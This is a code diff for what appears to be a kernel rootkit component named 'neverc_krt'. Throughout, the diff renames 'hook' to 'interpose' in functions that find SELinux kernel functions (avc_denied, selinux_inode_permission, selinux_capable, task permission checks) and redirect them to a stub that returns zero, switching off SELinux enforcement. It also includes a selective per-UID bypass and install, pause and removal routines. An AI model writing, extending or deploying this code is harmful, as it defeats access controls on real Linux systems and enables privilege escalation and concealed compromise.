@@ -4,10 +4,10 @@
 
 static volatile int *_neverc_krt_selinux_enforcing;
 
-static struct neverc_krt_hook _neverc_krt_avc_hook;
-static struct neverc_krt_hook _neverc_krt_inode_hook;
-static struct neverc_krt_hook _neverc_krt_task_perm_hook;
-static struct neverc_krt_hook _neverc_krt_cred_perm_hook;
+static struct neverc_krt_interpose _neverc_krt_avc_interpose;
+static struct neverc_krt_interpose _neverc_krt_inode_interpose;
+static struct neverc_krt_interpose _neverc_krt_task_perm_interpose;
+static struct neverc_krt_interpose _neverc_krt_cred_perm_interpose;
 
 /* ---- internal helpers ---- */
 
@@ -50,9 +50,9 @@ struct neverc_krt_se_uid_entry {
 struct neverc_krt_se_selective {
 	struct neverc_krt_se_uid_entry uids[NEVERC_KRT_SE_UID_MAX];
 	int count;
-	struct neverc_krt_hook avc_hook;
-	struct neverc_krt_hook inode_hook;
-	struct neverc_krt_hook capable_hook;
+	struct neverc_krt_interpose avc_interpose;
+	struct neverc_krt_interpose inode_interpose;
+	struct neverc_krt_interpose capable_interpose;
 	int active;
 };
 
@@ -210,51 +210,51 @@ int neverc_krt_selinux_bypass_install(struct neverc_krt_selinux_bypass *state)
 	void *target;
 	int ret;
 
-	state->avc_hooked = 0;
-	state->inode_hooked = 0;
-	state->task_perm_hooked = 0;
-	state->cred_perm_hooked = 0;
+	state->avc_interposed = 0;
+	state->inode_interposed = 0;
+	state->task_perm_interposed = 0;
+	state->cred_perm_interposed = 0;
 	state->state_patched = 0;
 
 	target = NEVERC_KRT_LOOKUP("avc_denied");
 	if (target) {
-		ret = neverc_krt_hook_install(&_neverc_krt_avc_hook, target,
+		ret = neverc_krt_interpose_install(&_neverc_krt_avc_interpose, target,
 				       (void *)_neverc_krt_return_zero,
 				       (void **)&_neverc_krt_orig_avc);
 		if (ret == 0)
-			state->avc_hooked = 1;
+			state->avc_interposed = 1;
 	}
 
 	target = NEVERC_KRT_LOOKUP("selinux_inode_permission");
 	if (target) {
-		ret = neverc_krt_hook_install(&_neverc_krt_inode_hook, target,
+		ret = neverc_krt_interpose_install(&_neverc_krt_inode_interpose, target,
 				       (void *)_neverc_krt_return_zero,
 				       (void **)&_neverc_krt_orig_inode_perm);
 		if (ret == 0)
-			state->inode_hooked = 1;
+			state->inode_interposed = 1;
 	}
 
 	target = NEVERC_KRT_LOOKUP("selinux_task_setpgid");
 	if (!target)
 		target = NEVERC_KRT_LOOKUP("selinux_task_kill");
 	if (target) {
-		ret = neverc_krt_hook_install(&_neverc_krt_task_perm_hook, target,
+		ret = neverc_krt_interpose_install(&_neverc_krt_task_perm_interpose, target,
 				       (void *)_neverc_krt_return_zero,
 				       (void **)&_neverc_krt_orig_task_perm);
 		if (ret == 0)
-			state->task_perm_hooked = 1;
+			state->task_perm_interposed = 1;
 	}
 
 	target = NEVERC_KRT_LOOKUP("selinux_capable");
 	if (target) {
-		ret = neverc_krt_hook_install(&_neverc_krt_cred_perm_hook, target,
+		ret = neverc_krt_interpose_install(&_neverc_krt_cred_perm_interpose, target,
 				       (void *)_neverc_krt_return_zero,
 				       (void **)&_neverc_krt_orig_cred_perm);
 		if (ret == 0)
-			state->cred_perm_hooked = 1;
+			state->cred_perm_interposed = 1;
 	}
 
-	return (state->avc_hooked || state->inode_hooked) ? 0 : -1;
+	return (state->avc_interposed || state->inode_interposed) ? 0 : -1;
 }
 
 int neverc_krt_selinux_patch_state(struct neverc_krt_selinux_bypass *state)
@@ -303,21 +303,21 @@ void neverc_krt_selinux_bypass_remove(struct neverc_krt_selinux_bypass *state)
 	if (state->state_patched)
 		neverc_krt_selinux_restore_state(state);
 
-	if (state->cred_perm_hooked) {
-		neverc_krt_hook_remove(&_neverc_krt_cred_perm_hook);
-		state->cred_perm_hooked = 0;
+	if (state->cred_perm_interposed) {
+		neverc_krt_interpose_remove(&_neverc_krt_cred_perm_interpose);
+		state->cred_perm_interposed = 0;
 	}
-	if (state->task_perm_hooked) {
-		neverc_krt_hook_remove(&_neverc_krt_task_perm_hook);
-		state->task_perm_hooked = 0;
+	if (state->task_perm_interposed) {
+		neverc_krt_interpose_remove(&_neverc_krt_task_perm_interpose);
+		state->task_perm_interposed = 0;
 	}
-	if (state->inode_hooked) {
-		neverc_krt_hook_remove(&_neverc_krt_inode_hook);
-		state->inode_hooked = 0;
+	if (state->inode_interposed) {
+		neverc_krt_interpose_remove(&_neverc_krt_inode_interpose);
+		state->inode_interposed = 0;
 	}
-	if (state->avc_hooked) {
-		neverc_krt_hook_remove(&_neverc_krt_avc_hook);
-		state->avc_hooked = 0;
+	if (state->avc_interposed) {
+		neverc_krt_interpose_remove(&_neverc_krt_avc_interpose);
+		state->avc_interposed = 0;
 	}
 }
 
@@ -398,74 +398,74 @@ static long _neverc_krt_sel_capable_filter(void)
 int neverc_krt_se_selective_install(void)
 {
 	void *target;
-	int hooked = 0;
+	int interposed = 0;
 
 	if (_neverc_krt_se_sel.active) return 0;
 
 	target = NEVERC_KRT_LOOKUP("avc_denied");
 	if (target) {
-		if (neverc_krt_hook_install(&_neverc_krt_se_sel.avc_hook, target,
+		if (neverc_krt_interpose_install(&_neverc_krt_se_sel.avc_interpose, target,
 				     (void *)_neverc_krt_sel_avc_filter,
 				     (void **)&_neverc_krt_sel_orig_avc) == 0)
-			hooked++;
+			interposed++;
 	}
 
 	target = NEVERC_KRT_LOOKUP("selinux_inode_permission");
 	if (target) {
-		if (neverc_krt_hook_install(&_neverc_krt_se_sel.inode_hook, target,
+		if (neverc_krt_interpose_install(&_neverc_krt_se_sel.inode_interpose, target,
 				     (void *)_neverc_krt_sel_inode_filter,
 				     (void **)&_neverc_krt_sel_orig_inode) == 0)
-			hooked++;
+			interposed++;
 	}
 
 	target = NEVERC_KRT_LOOKUP("selinux_capable");
 	if (target) {
-		if (neverc_krt_hook_install(&_neverc_krt_se_sel.capable_hook, target,
+		if (neverc_krt_interpose_install(&_neverc_krt_se_sel.capable_interpose, target,
 				     (void *)_neverc_krt_sel_capable_filter,
 				     (void **)&_neverc_krt_sel_orig_capable) == 0)
-			hooked++;
+			interposed++;
 	}
 
 	_neverc_krt_se_sel.active = 1;
-	return hooked > 0 ? 0 : -1;
+	return interposed > 0 ? 0 : -1;
 }
 
 void neverc_krt_se_selective_cleanup(void)
 {
 	if (!_neverc_krt_se_sel.active) return;
 
-	if (_neverc_krt_se_sel.capable_hook.active)
-		neverc_krt_hook_remove(&_neverc_krt_se_sel.capable_hook);
-	if (_neverc_krt_se_sel.inode_hook.active)
-		neverc_krt_hook_remove(&_neverc_krt_se_sel.inode_hook);
-	if (_neverc_krt_se_sel.avc_hook.active)
-		neverc_krt_hook_remove(&_neverc_krt_se_sel.avc_hook);
+	if (_neverc_krt_se_sel.capable_interpose.active)
+		neverc_krt_interpose_remove(&_neverc_krt_se_sel.capable_interpose);
+	if (_neverc_krt_se_sel.inode_interpose.active)
+		neverc_krt_interpose_remove(&_neverc_krt_se_sel.inode_interpose);
+	if (_neverc_krt_se_sel.avc_interpose.active)
+		neverc_krt_interpose_remove(&_neverc_krt_se_sel.avc_interpose);
 
 	_neverc_krt_se_sel.active = 0;
 	_neverc_krt_se_sel.count = 0;
 }
 
-void neverc_krt_selinux_pause_hooks(void)
+void neverc_krt_selinux_pause_interposes(void)
 {
-	if (_neverc_krt_avc_hook.active)
-		neverc_krt_hook_pause(&_neverc_krt_avc_hook);
-	if (_neverc_krt_inode_hook.active)
-		neverc_krt_hook_pause(&_neverc_krt_inode_hook);
-	if (_neverc_krt_task_perm_hook.active)
-		neverc_krt_hook_pause(&_neverc_krt_task_perm_hook);
-	if (_neverc_krt_cred_perm_hook.active)
-		neverc_krt_hook_pause(&_neverc_krt_cred_perm_hook);
+	if (_neverc_krt_avc_interpose.active)
+		neverc_krt_interpose_pause(&_neverc_krt_avc_interpose);
+	if (_neverc_krt_inode_interpose.active)
+		neverc_krt_interpose_pause(&_neverc_krt_inode_interpose);
+	if (_neverc_krt_task_perm_interpose.active)
+		neverc_krt_interpose_pause(&_neverc_krt_task_perm_interpose);
+	if (_neverc_krt_cred_perm_interpose.active)
+		neverc_krt_interpose_pause(&_neverc_krt_cred_perm_interpose);
 }
 
-void neverc_krt_selinux_remove_hooks(void)
+void neverc_krt_selinux_remove_interposes(void)
 {
-	if (_neverc_krt_cred_perm_hook.active)
-		neverc_krt_hook_remove(&_neverc_krt_cred_perm_hook);
-	if (_neverc_krt_task_perm_hook.active)
-		neverc_krt_hook_remove(&_neverc_krt_task_perm_hook);
-	if (_neverc_krt_inode_hook.active)
-		neverc_krt_hook_remove(&_neverc_krt_inode_hook);
-	if (_neverc_krt_avc_hook.active)
-		neverc_krt_hook_remove(&_neverc_krt_avc_hook);
+	if (_neverc_krt_cred_perm_interpose.active)
+		neverc_krt_interpose_remove(&_neverc_krt_cred_perm_interpose);
+	if (_neverc_krt_task_perm_interpose.active)
+		neverc_krt_interpose_remove(&_neverc_krt_task_perm_interpose);
+	if (_neverc_krt_inode_interpose.active)
+		neverc_krt_interpose_remove(&_neverc_krt_inode_interpose);
+	if (_neverc_krt_avc_interpose.active)
+		neverc_krt_interpose_remove(&_neverc_krt_avc_interpose);
 }
 
